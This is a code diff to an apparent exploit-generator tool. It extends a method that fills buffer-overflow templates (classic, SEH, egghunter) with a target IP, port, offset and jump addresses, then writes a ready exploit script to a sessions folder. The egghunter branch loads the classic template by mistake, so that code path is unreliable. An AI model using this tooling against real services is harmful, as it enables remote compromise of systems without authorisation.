@@ -228,24 +228,46 @@ class System:
     @staticmethod
     def generate_exploit(config):
 
+        exploittype = System.input("[?] What kind of exploit to you want to generate? [C]lassic | [S]EH | [E]ggHunter: ")
+
         adapter = System.get_adapter(config)
         stream_func = getattr(adapter, 'output_stream')
         output_stream = stream_func(config.field)
 
-        if os.path.isfile("templates/classic.tpl"):
-            try:
+        try:
+
+            if exploittype == "C":
+                file = "templates/classic.tpl"
+
+            if exploittype == "S":
+                file = "templates/seh.tpl"
+
+            if exploittype == "E":
+                file = "templates/classic.tpl"
+
+            if os.path.isfile(file):
+
                 if (sys.version_info >= (3, 0)):
-                    with io.open("templates/classic.tpl", 'rb', buffering=0) as default_skel:
+                    with io.open(file, 'rb', buffering=0) as default_skel:
                         source = (default_skel.readall())
-                        # line = default_skel.readline()
-                        # cnt = 1
-                        # while line:
+
                         source = source.replace(b"{{{REMOTEIP}}}", config.remoteip.encode('latin1'))
                         source = source.replace(b"{{{REMOTEPORT}}}", str(config.remoteport).encode('latin1'))
                         source = source.replace(b"{{{OFFSET}}}", str(config.offset).encode('latin1'))
-                        source = source.replace(b"{{{JMPESP_ADD}}}", str(config.jmpesp_add).encode('latin1'))
                         source = source.replace(b"{{{NOPS}}}", str(config.nops).encode('latin1'))
                         source = source.replace(b"{{{COMMUNICATION_FLOW}}}", str(output_stream).encode('latin1'))
+
+                        if exploittype == "C":
+                            source = source.replace(b"{{{JMPESP_ADD}}}", str(config.jmpesp_add).encode('latin1'))
+
+                        if exploittype == "S":
+                            source = source.replace(b"{{{NEXT_SEH}}}", str(config.nextseh).encode('latin1'))
+                            source = source.replace(b"{{{SEH}}}", str(config.seh).encode('latin1'))
+
+                        if exploittype == "E":
+                            source = source.replace(b"{{{HUNTER}}}", str(config.hunter).encode('latin1'))
+                            source = source.replace(b"{{{EGG}}}", str(config.egg).encode('latin1'))
+                            source = source.replace(b"{{{JMP_SHORT}}}", str(config.instruction).encode('latin1'))
 
                         if (config.verbose_lv >= 1):
                             print("=" * 30)
@@ -254,8 +276,8 @@ class System:
 
                     default_skel.close()
 
-            except Exception as e:
-                logging.exception(e)
+        except Exception as e:
+            logging.exception(e)
 
         System.file_write("sessions/exploit_" + config.remoteip + "_" + str(config.remoteport) + "_" + config.field + ".py", source)
 
